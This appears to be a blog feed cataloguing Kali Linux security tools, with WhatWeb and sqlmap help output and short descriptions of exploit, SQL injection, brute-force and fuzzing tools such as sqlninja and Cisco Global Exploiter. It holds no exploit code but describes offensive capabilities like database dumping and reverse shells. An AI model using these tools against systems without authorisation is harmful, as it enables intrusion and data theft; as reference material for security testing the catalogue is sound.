$$$$     $$. .$$$  $$$ .$$$$$$.  .$$$$$$$$$$. $$$$     $$. .$$$$$$$. .$$$$$$.
$ $$     $$$ $ $$  $$$ $ $$$$$$. $$$$$ $$$$$$ $ $$     $$$ $ $$   $$ $ $$$$$$.
$</code>$     $$$ $ <code>$  $$$ $</code>$  $$$ $$&lsquo; $ <code>$</code>$$ $ <code>$     $$$ $</code>$      $ <code>$  $$$'
$. $     $$$ $. $$$$$$ $. $$$$$$</code>$  $. $  :&rsquo; $. $     $$$ $. $$$$   $. $$$$$.
$::$  .  $$$ $::$  $$$ $::$  $$$     $::$     $::$  .  $$$ $::$      $::$  $$$$
$;;$ $$$ $$$ $;;$  $$$ $;;$  $$$     $;;$     $;;$ $$$ $$$ $;;$      $;;$  $$$$
$$$$$$ $$$$$ $$$$  $$$ $$$$  $$$     $$$$     $$$$$$ $$$$$ $$$$$$$$$ $$$$$$$$$'</p>

<p>WhatWeb &ndash; Next generation web scanner.
Version 0.4.8-dev by Andrew Horton aka urbanadventurer
Homepage: <a href="http://www.morningstarsecurity.com/research/whatweb">http://www.morningstarsecurity.com/research/whatweb</a></p>

<p>Usage: whatweb [options] <URLs></p>

<p>TARGET SELECTION:
  <URLs>        Enter URLs, filenames or nmap-format IP ranges.</p>

<pre><code>        Use /dev/stdin to pipe HTML directly
</code></pre>

<p>  &mdash;input-file=FILE, -i Identify URLs found in FILE, eg. -i /dev/stdin</p>

<p>TARGET MODIFICATION:
  &mdash;url-prefix      Add a prefix to target URLs
  &mdash;url-suffix      Add a suffix to target URLs
  &mdash;url-pattern     Insert the targets into a URL. Requires &mdash;input-file,</p>

<pre><code>        eg. www.example.com/%insert%/robots.txt 
</code></pre>

<p>AGGRESSION:
  The aggression level controls the trade-off between speed/stealth and
  reliability.
  &mdash;aggression, -a=LEVEL Set the aggression level. Default: 1
  Aggression levels are:
  1. Stealthy   Makes one HTTP request per target. Also follows redirects.
  2. Unused
  3. Aggressive Can make a handful of HTTP requests per target. This triggers</p>

<pre><code>    aggressive plugins for targets only when those plugins are
    identified with a level 1 request first.
</code></pre>

<ol>
<li> Heavy  Makes a lot of HTTP requests per target. Aggressive tests from
    all plugins are used for all URLs.</li>
</ol>


<p>HTTP OPTIONS:
  &mdash;user-agent, -U=AGENT Identify as AGENT instead of WhatWeb/0.4.8-dev.
  &mdash;header, -H      Add an HTTP header. eg &ldquo;Foo:Bar&rdquo;. Specifying a default</p>

<pre><code>        header will replace it. Specifying an empty value, eg.
        "User-Agent:" will remove the header.
</code></pre>

<p>  &mdash;follow-redirect=WHEN Control when to follow redirects. WHEN may be `never',</p>

<pre><code>        `http-only', `meta-only', `same-site', `same-domain'
        or `always'. Default: always
</code></pre>

<p>  &mdash;max-redirects=NUM   Maximum number of contiguous redirects. Default: 10</p>

<p>AUTHENTICATION:
  &mdash;user, -u=&lt;user:password> HTTP basic authentication
  Add session cookies with &mdash;header, e.g. &mdash;header &ldquo;Cookie: SESSID=1a2b3c;&rdquo;</p>

<p>PROXY:
  &mdash;proxy       &lt;hostname[:port]> Set proxy hostname and port</p>

<pre><code>        Default: 8080
</code></pre>

<p>  &mdash;proxy-user      &lt;username:password> Set proxy user and password</p>

<p>PLUGINS:
  &mdash;list-plugins, -l    List all plugins
  &mdash;plugins, -p=LIST    Select plugins. LIST is a comma delimited set of</p>

<pre><code>        selected plugins. Default is all.
        Each element can be a directory, file or plugin name and
        can optionally have a modifier, eg. + or -
        Examples: +/tmp/moo.rb,+/tmp/foo.rb
        title,md5,+./plugins-disabled/
        ./plugins-disabled,-md5
        -p + is a shortcut for -p +plugins-disabled
</code></pre>

<p>  &mdash;info-plugins, -I=PLUGINS    Display detailed information for plugins.</p>

<pre><code>        Optionally search with keywords in a comma delimited
        list.
</code></pre>

<p>  &mdash;grep, -g=STRING Search for STRING in HTTP responses. Reports with a</p>

<pre><code>        plugin named Grep
</code></pre>

<p>  &mdash;custom-plugin=DEFINITION    Define a custom plugin named Custom-Plugin,</p>

<pre><code>        Examples: ":text=&gt;'powered by abc'"
        ":version=&gt;/powered[ ]?by ab[0-9]/"
        ":ghdb=&gt;'intitle:abc \"powered by abc\"'"
        ":md5=&gt;'8666257030b94d3bdb46e05945f60b42'"
        "{:text=&gt;'powered by abc'},{:regexp=&gt;/abc [ ]?1/i}"
</code></pre>

<p>  &mdash;dorks=PLUGIN    List google dorks for the selected plugin
  &mdash;example-urls, -e=PLUGIN Update the target list with example URLs from</p>

<pre><code>        the selected plugins.
</code></pre>

<p>OUTPUT:
  &mdash;verbose, -v     Verbose output includes plugin descriptions. Use twice</p>

<pre><code>        for debugging.
</code></pre>

<p>  &mdash;colour,&mdash;color=WHEN control whether colour is used. WHEN may be `never',</p>

<pre><code>        `always', or `auto'
</code></pre>

<p>  &mdash;quiet, -q       Do not display brief logging to STDOUT
  &mdash;no-errors       Suppress error messages</p>

<p>LOGGING:
  &mdash;log-brief=FILE  Log brief, one-line output
  &mdash;log-verbose=FILE    Log verbose output
  &mdash;log-xml=FILE    Log XML format
  &mdash;log-json=FILE   Log JSON format
  &mdash;log-json-verbose=FILE Log JSON Verbose format
  &mdash;log-magictree=FILE  Log MagicTree XML format
  &mdash;log-object=FILE Log Ruby object inspection format
  &mdash;log-mongo-database  Name of the MongoDB database
  &mdash;log-mongo-collection Name of the MongoDB collection. Default: whatweb
  &mdash;log-mongo-host  MongoDB hostname or IP address. Default: 0.0.0.0
  &mdash;log-mongo-username  MongoDB username. Default: nil
  &mdash;log-mongo-password  MongoDB password. Default: nil
  &mdash;log-errors=FILE Log errors</p>

<p>PERFORMANCE &amp; STABILITY:
  &mdash;max-threads, -t Number of simultaneous threads. Default: 25.
  &mdash;open-timeout    Time in seconds. Default: 15
  &mdash;read-timeout    Time in seconds. Default: 30
  &mdash;wait=SECONDS    Wait SECONDS between connections</p>

<pre><code>        This is useful when using a single thread.
</code></pre>

<p>HELP &amp; MISCELLANEOUS:
  &mdash;help, -h        This help
  &mdash;debug       Raise errors in plugins
  &mdash;version     Display version information. (WhatWeb 0.4.8-dev)</p>

<p>EXAMPLE USAGE:
* Scan example.com
  whatweb example.com
* Scan reddit.com slashdot.org with verbose plugin descriptions
  whatweb -v reddit.com slashdot.org
* An aggressive scan of mashable.com detects the exact version of Wordpress
  whatweb -a 3 mashable.com
* Scan the local network quickly with 255 threads and suppress errors
  whatweb &mdash;no-errors -t 255 192.168.0.0/24</p>

<h2>OPTIONAL DEPENDENCIES</h2>

<p>To enable MongoDB logging install the mongo gem.
```</p>

<p>This was the Web Applications section. Don&rsquo;t forget that you can check tools usage examples and descriptions on <a href="http://tools.kali.org/tools-listing">http://tools.kali.org/tools-listing</a></p>

<blockquote><p>Q:    How did you get into artificial intelligence?</p>

<p>A:    Seemed logical &mdash; I didn&rsquo;t have any real intelligence.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Vulnerability Analysis]]></title>
    <link href="http://chousensha.github.io/blog/2014/09/17/kali-tools-catalog-vulnerability-analysis/"/>
    <updated>2014-09-17T21:36:25+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/09/17/kali-tools-catalog-vulnerability-analysis</id>
    <content type="html"><![CDATA[<p>Today I am going to continue with cataloguing the security tools that are installed on Kali. Next is the Vulnerability Analysis section.</p>

<!-- more -->


<h3>Cisco Tools</h3>

<p><strong>cisco-global-exploiter</strong></p>

<p>Cisco Global Exploiter (CGE), is an advanced, simple and fast security testing tool/ exploit engine, that is able to exploit 14 vulnerabilities in disparate Cisco switches and routers.</p>

<p><img class="center" src="/images/kali/vuln/cge.png" title="&lsquo;cge&rsquo; &lsquo;cge&rsquo;" ></p>

<p><strong>cisco-ocs</strong></p>

<p>Compact mass scanner for Cisco routers with default telnet/enable passwords.</p>

<p><img class="center" src="/images/kali/vuln/cisco-ocs.png" title="&lsquo;cisco-ocs&rsquo; &lsquo;cisco-ocs&rsquo;" ></p>

<p><strong>yersinia</strong></p>

<p>yersinia is a framework for performing layer 2 attacks. The following protocols have
been implemented in Yersinia current version: Spanning  Tree  Protocol  (STP),  VLAN
Trunking Protocol (VTP), Hot Standby Router Protocol (HSRP), Dynamic Trunking Protocol (DTP), IEEE 802.1Q, IEEE 802.1X, Cisco Discovery Protocol  (CDP),  Dynamic  Host
Configuration  Protocol  (DHCP),  Inter-Switch Link Protocol (ISL) and MultiProtocol Label Switching (MPLS).</p>

<p>Some of the attacks implemented will cause a DoS in a network, other  will  help  to
perform  any  other more advanced attack, or both. In addition, some of them will be
first released to the public since there isn&rsquo;t any public implementation.</p>

<p><img class="center" src="/images/kali/vuln/yersinia.png" title="&lsquo;yersinia&rsquo; &lsquo;yersinia&rsquo;" ></p>

<h3>Database Assessment</h3>

<p><strong>bbqsql</strong></p>

<p>BBQSQL is a blind SQL injection framework written in Python.</p>

<p><img class="center" src="/images/kali/vuln/bbqsql.png" title="&lsquo;bbqsql&rsquo; &lsquo;bbqsql&rsquo;" ></p>

<p><strong>dbpwaudit</strong></p>

<p>DBPwAudit is a Java tool that allows you to perform online audits of password quality for several database engines.</p>

<p><img class="center" src="/images/kali/vuln/dbpwaudit.png" title="&lsquo;dbpwaudit&rsquo; &lsquo;dbpwaudit&rsquo;" ></p>

<p><strong>hexorbase</strong></p>

<p>HexorBase is a database application designed for administering and auditing multiple database servers simultaneously from a centralized location, it is capable of performing SQL queries and bruteforce attacks against common database servers (MySQL, SQLite, Microsoft SQL Server, Oracle, PostgreSQL ).HexorBase allows packet routing through proxies or even metasploit pivoting antics to communicate with remotely inaccessible servers which are hidden within local subnets.</p>

<p><img class="center" src="/images/kali/vuln/hexorbase.png" title="&lsquo;hexorbase&rsquo; &lsquo;hexorbase&rsquo;" ></p>

<p><strong>jsql</strong></p>

<p>jSQL Injection is a lightweight application used to find database information from a distant server.</p>

<p><img class="center" src="/images/kali/vuln/jsql.png" title="&lsquo;jsql&rsquo; &lsquo;jsql&rsquo;" ></p>

<p><strong>mdb-export</strong></p>

<p>Export data in an MDB database table to CSV format.</p>

<p><img class="center" src="/images/kali/vuln/mdb-export.png" title="&lsquo;mdb-export&rsquo; &lsquo;mdb-export&rsquo;" ></p>

<p><strong>mdb-hexdump</strong></p>

<p>makes a hex dump of a binary file</p>

<p><strong>mdb-parsecsv</strong></p>

<p>mdb-parsecsv  takes  a CSV file representing a database table, and converts it into a C array.</p>

<p><strong>mdb-sql</strong></p>

<p>mdb-sql  allows  querying of an MDB database using a limited SQL subset language.</p>

<p><strong>mdb-tables</strong></p>

<p>It produces a list of tables contained within an MDB database in a format suitable for use in shell scripts.</p>

<p><strong>oscanner</strong></p>

<p>Oscanner is an Oracle assessment framework developed in Java. It has a plugin-based architecture and comes with a couple of plugins that currently do:</p>

<p>– Sid Enumeration
– Passwords tests (common &amp; dictionary)
– Enumerate Oracle version
– Enumerate account roles
– Enumerate account privileges
– Enumerate account hashes
– Enumerate audit information
– Enumerate password policies
– Enumerate database links</p>

<p>The results are given in a graphical java tree.</p>

<p><strong>sidguesser</strong></p>

<p>Guesses sids/instances against an Oracle database according to a predefined dictionary file.</p>

<p><strong>sqldict</strong></p>

<p>SQLdict is a basic single ip brute-force MS SQL Server password utility that can carry out a dictionary attack against a named SQL account.</p>

<p><img class="center" src="/images/kali/vuln/sqldict.png" title="&lsquo;sqldict&rsquo; &lsquo;sqldict&rsquo;" ></p>

<p><strong>sqlmap</strong></p>

<p>sqlmap  is  an automatic SQL injection tool entirely developed in Python.  Its goal is to detect and take advantage of SQL injection vulnerabilities on web applications. Once it
detects one or more SQL injections on the target host, the user can choose among a variety of options to perform an extensive back-end database  management  system  fingerprint,
retrieve  DBMS  session  user  and  database, enumerate users, password hashes, privileges, databases, dump entire or user&rsquo;s specific DBMS tables/columns, run his own SQL SELECT
statement, read specific files on the file system and much more.</p>

<p>``` plain
Usage: python sqlmap [options]</p>

<p>Options:
  -h, &mdash;help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  &mdash;version             Show program&rsquo;s version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)</p>

<p>  Target:</p>

<pre><code>At least one of these options has to be provided to define the
target(s)

-u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
-g GOOGLEDORK       Process Google dork results as target URLs
</code></pre>

<p>  Request:</p>

<pre><code>These options can be used to specify how to connect to the target URL

--data=DATA         Data string to be sent through POST
--cookie=COOKIE     HTTP Cookie header value
--random-agent      Use randomly selected HTTP User-Agent header value
--proxy=PROXY       Use a proxy to connect to the target URL
--tor               Use Tor anonymity network
--check-tor         Check to see if Tor is used properly
</code></pre>

<p>  Injection:</p>

<pre><code>These options can be used to specify which parameters to test for,
provide custom injection payloads and optional tampering scripts

-p TESTPARAMETER    Testable parameter(s)
--dbms=DBMS         Force back-end DBMS to this value
</code></pre>

<p>  Detection:</p>

<pre><code>These options can be used to customize the detection phase

--level=LEVEL       Level of tests to perform (1-5, default 1)
--risk=RISK         Risk of tests to perform (0-3, default 1)
</code></pre>

<p>  Techniques:</p>

<pre><code>These options can be used to tweak testing of specific SQL injection
techniques

--technique=TECH    SQL injection techniques to use (default "BEUSTQ")
</code></pre>

<p>  Enumeration:</p>

<pre><code>These options can be used to enumerate the back-end database
management system information, structure and data contained in the
tables. Moreover you can run your own SQL statements

-a, --all           Retrieve everything
-b, --banner        Retrieve DBMS banner
--current-user      Retrieve DBMS current user
--current-db        Retrieve DBMS current database
--passwords         Enumerate DBMS users password hashes
--tables            Enumerate DBMS database tables
--columns           Enumerate DBMS database table columns
--schema            Enumerate DBMS schema
--dump              Dump DBMS database table entries
--dump-all          Dump all DBMS databases tables entries
-D DB               DBMS database to enumerate
-T TBL              DBMS database table(s) to enumerate
-C COL              DBMS database table column(s) to enumerate
</code></pre>

<p>  Operating system access:</p>

<pre><code>These options can be used to access the back-end database management
system underlying operating system

--os-shell          Prompt for an interactive operating system shell
--os-pwn            Prompt for an OOB shell, Meterpreter or VNC
</code></pre>

<p>  General:</p>

<pre><code>These options can be used to set some general working parameters

--batch             Never ask for user input, use the default behaviour
--flush-session     Flush session files for current target
</code></pre>

<p>  Miscellaneous:</p>

<pre><code>--sqlmap-shell      Prompt for an interactive sqlmap shell
--wizard            Simple wizard interface for beginner users
</code></pre>

<p>[!] to see full list of options run with &lsquo;-hh&rsquo;
```</p>

<p><strong>sqlninja</strong></p>

<p>Sqlninja is a tool targeted to exploit SQL Injection vulnerabilities on a web application that uses Microsoft SQL Server as its back-end.</p>

<p>Features:</p>

<p>Fingerprint of the remote SQL Server (version, user performing the queries, user privileges, xp_cmdshell availability, DB authentication mode)</p>

<p>Data extraction, time-based or via a DNS tunnel</p>

<p>Integration with Metasploit3, to obtain a graphical access to the remote DB server through a VNC server injection or just to upload Meterpreter</p>

<p>Upload of executables using only normal HTTP requests (no FTP/TFTP needed), via vbscript or debug.exe</p>

<p>Direct and reverse bindshell, both TCP and UDP</p>

<p>DNS-tunneled pseudo-shell, when no TCP/UDP ports are available for a direct/reverse shell, but the DB server can resolve external hostnames</p>

<p>ICMP-tunneled shell, when no TCP/UDP ports are available for a direct/reverse shell but the DB can ping your box</p>

<p>Bruteforce of &lsquo;sa&rsquo; password (in 2 flavors: dictionary-based and incremental)</p>

<p>Privilege escalation to sysadmin group if &lsquo;sa&rsquo; password has been found</p>

<p>Creation of a custom xp_cmdshell if the original one has been removed</p>

<p>TCP/UDP portscan from the target SQL Server to the attacking machine, in order to find a port that is allowed by the firewall of the target network and use it for a reverse shell</p>

<p>Evasion techniques to confuse a few IDS/IPS/WAF</p>

<p>Integration with churrasco.exe, to escalate privileges to SYSTEM on w2k3 via token kidnapping</p>

<p>Support for CVE-2010-0232, to escalate the privileges of sqlservr.exe to SYSTEM</p>

<p><img class="center" src="/images/kali/vuln/sqlninja.png" title="&lsquo;sqlninja&rsquo; &lsquo;sqlninja&rsquo;" ></p>

<p><strong>sqlsus</strong></p>

<p>sqlsus is an open source MySQL injection and takeover tool, written in perl.</p>

<p><strong>tnscmd10g</strong></p>

<p>Tnscmd can be used to communicate directly with Oracle&rsquo;s TNS listener, (no client is needed).  Unlike the Oracle
listener control utility LSNRCTL.exe, TNSCmd.pl does not need any connection strings and a direct
bi-directional conversation can be immediately established.</p>

<p><img class="center" src="/images/kali/vuln/tnscmd10g.png" title="&lsquo;tnscmd10g&rsquo; &lsquo;tnscmd10g&rsquo;" ></p>

<h3>Fuzzing Tools</h3>

<p><strong>bed</strong></p>

<p>Bruteforce Exploit Detector is a plain-text protocol fuzzer that checks software for common vulnerabilities like buffer overflows, format string bugs, integer overflows, etc.</p>

<p><img class="center" src="/images/kali/vuln/bed.png" title="&lsquo;bed&rsquo; &lsquo;bed&rsquo;" ></p>

<p><strong>fuzz_ip6</strong></p>

<p>The name is self explanatory.</p>

<p><img class="center" src="/images/kali/vuln/fuzz_ip6.png" title="&lsquo;fuzz_ip6&rsquo; &lsquo;fuzz_ip6&rsquo;" ></p>

<p><strong>ohrwurm</strong></p>

<p>RTP fuzzer</p>

<p><img class="center" src="/images/kali/vuln/ohrwurm.png" title="&lsquo;ohrwurm&rsquo; &lsquo;ohrwurm&rsquo;" ></p>

<p><strong>powerfuzzer</strong></p>

<p>highly automated and fully customizable web fuzzer (HTTP protocol based application fuzzer)</p>

<p><img class="center" src="/images/kali/vuln/powerfuzzer.png" title="&lsquo;powerfuzzer&rsquo; &lsquo;powerfuzzer&rsquo;" ></p>

<p><strong>sfuzz</strong></p>

<p>Simple Fuzz(sfuzz) is a simple fuzzer. It has two network modes of operation, an output mode for developing command line fuzzing scripts, as well as taking fuzzing strings from literals and building strings from sequences.</p>

<p><img class="center" src="/images/kali/vuln/sfuzz.png" title="&lsquo;sfuzz&rsquo; &lsquo;sfuzz&rsquo;" ></p>

<p><strong>siparmyknife</strong></p>

<p>SIP Army Knife is a fuzzer that searches for cross site scripting, SQL injection, log injection, format strings, buffer overflows, and more.</p>

<p><strong>spike generic_chunked &amp; generic_listen_tcp &amp; generic_send_tcp &amp; generic_send_udp</strong></p>

<p>SPIKE is a Fuzzer Creation Kit. You can use it for fuzzing or leverage its API to write your own fuzzers.</p>

<h3>Misc Scanners</h3>

<p><strong>golismero</strong></p>

<p>GoLismero is an open source framework for security testing. It&rsquo;s currently geared towards web security, but it can easily be expanded to other kinds of scans.</p>

<p>``` plain
/&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;\
| GoLismero 2.0.0b3 &ndash; The Web Knife            |
| Contact: golismero.project&lt;@>gmail.com       |
|                                              |
| Daniel Garcia Garcia a.k.a cr0hn (@ggdaniel) |
| Mario Vilas (@Mario_Vilas)                   |
-&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;/</p>

<p>usage: golismero.py COMMAND [TARGETS&hellip;] [&mdash;options]</p>

<p>  SCAN:</p>

<pre><code>Perform a vulnerability scan on the given targets. Optionally import
results from other tools and write a report. The arguments that follow may
be domain names, IP addresses or web pages.
</code></pre>

<p>  PROFILES:</p>

<pre><code>Show a list of available config profiles. This command takes no arguments.
</code></pre>

<p>  PLUGINS:</p>

<pre><code>Show a list of available plugins. This command takes no arguments.
</code></pre>

<p>  INFO:</p>

<pre><code>Show detailed information on a given plugin. The arguments that follow are
the plugin IDs. You can use glob-style wildcards.
</code></pre>

<p>  REPORT:</p>

<pre><code>Write a report from an earlier scan. This command takes no arguments.
To specify output files use the -o switch.
</code></pre>

<p>  IMPORT:</p>

<pre><code>Import results from other tools and optionally write a report, but don't
scan the targets. This command takes no arguments. To specify input files
use the -i switch.
</code></pre>

<p>  DUMP:</p>

<pre><code>Dump the database from an earlier scan in SQL format. This command takes no
arguments. To specify output files use the -o switch.
</code></pre>

<p>  UPDATE:</p>

<pre><code>Update GoLismero to the latest version. Requires Git to be installed and
available in the PATH. This command takes no arguments.
</code></pre>

<p>examples:</p>

<p>  scan a website and show the results on screen:</p>

<pre><code>golismero.py scan http://www.example.com
</code></pre>

<p>  grab Nmap results, scan all hosts found and write an HTML report:</p>

<pre><code>golismero.py scan -i nmap_output.xml -o report.html
</code></pre>

<p>  grab results from OpenVAS and show them on screen, but don&rsquo;t scan anything:</p>

<pre><code>golismero.py import -i openvas_output.xml
</code></pre>

<p>  show a list of all available configuration profiles:</p>

<pre><code>golismero.py profiles
</code></pre>

<p>  show a list of all available plugins:</p>

<pre><code>golismero.py plugins
</code></pre>

<p>  show information on all bruteforcer plugins:</p>

<pre><code>golismero.py info brute_*
</code></pre>

<p>  dump the database from a previous scan:</p>

<pre><code>golismero.py dump -db example.db -o dump.sql
</code></pre>

<p>```</p>

<p><strong>lynis</strong></p>

<p>Run a system and security audit on the system</p>

<p>The following system areas may be checked:</p>

<ul>
<li><p>Boot loader files</p></li>
<li><p>Configuration files</p></li>
<li><p>Common files by software packages</p></li>
<li><p>Directories and files related to logging and auditing</p></li>
</ul>


<p><img class="center" src="/images/kali/vuln/lynis.png" title="&lsquo;lynis&rsquo; &lsquo;lynis&rsquo;" ></p>

<p><strong>nikto</strong></p>

<p>Examine a web server to find potential problems and security vulnerabilities, including:</p>

<p>·   Server and software misconfigurations</p>

<p>·   Default files and programs</p>

<p>·   Insecure files and programs</p>

<p>·   Outdated servers and programs</p>

<p>Nikto is built on LibWhisker (by RFP) and can run on any platform which has a Perl
environment. It supports SSL, proxies, host authentication, IDS evasion and more. It
can be updated automatically from the command-line, and supports the optional
submission of updated version data back to the maintainers.</p>

<p><img class="center" src="/images/kali/vuln/nikto.png" title="&lsquo;nikto&rsquo; &lsquo;nikto&rsquo;" ></p>

<p><strong>unix-privesc-check</strong></p>

<p>This script checks file permissions and other settings that could allow local users to escalate privileges.</p>

<p><img class="center" src="/images/kali/vuln/unix-privesc-check.png" title="&lsquo;unix-privesc-check&rsquo; &lsquo;unix-privesc-check&rsquo;" ></p>

<h3>Open Source Assessment</h3>

<p>Covered in other categories.</p>

<h3>OpenVAS</h3>

<p>OpenVAS is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution.</p>

<p><strong>openvas-check-setup</strong></p>

<p>analyzes the state of your OpenVAS installation and proposes fixes should it detect any errors or misconfigurations. It will also check if all required OpenVAS services are running and listening on the correct ports.</p>

<p><strong>openvas-gsd</strong></p>

<p>The Greenbone Security Desktop (GSD) is a Qt-based desktop client for the OpenVAS Management Protocol</p>

<p><img class="center" src="/images/kali/vuln/openvas.png" title="&lsquo;openvas&rsquo; &lsquo;openvas&rsquo;" ></p>

<p>Let&rsquo;s see what fortune has in store for today:</p>

<blockquote><p>Don&rsquo;t look now, but there is a multi-legged creature on your shoulder.</p></blockquote>
]]></content>
  </entry>
  
</feed>
